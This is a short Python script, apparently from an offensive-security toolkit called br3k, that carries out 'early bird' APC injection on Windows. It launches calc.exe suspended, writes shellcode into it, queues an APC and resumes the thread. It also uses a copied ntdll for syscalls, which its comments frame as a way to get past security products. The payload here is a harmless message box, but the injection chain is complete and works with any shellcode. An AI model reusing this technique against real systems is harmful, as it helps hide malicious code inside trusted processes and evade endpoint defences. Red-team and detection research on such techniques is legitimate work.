# NOTE:
# The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
# so we don't need to search an alertable thread, APC will be executed immediately
# On the other hand, running a suspended process and resuming threads are red flags for security solutions
# but without suspension it will be a regular APC injection (but into a newly started process)
# TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script

import br3k
from br3k import ProcessMemoryStrategy

if __name__ == "__main__":

    print("Script: Inject via queue user APC (early bird)")
    print()

    br3k.init_sysapi(ntdll_copy=True)

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        image_path="C:\\Windows\\system32\\calc.exe",
        memory_strategy=ProcessMemoryStrategy.AllocateInAddr
    )

    process.create_user(suspended=True)

    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()

    process.write_memory(data=shellcode)
    process.thread_queue_user_apc(ep=ep)
    process.resume_thread()

    br3k.script_success()
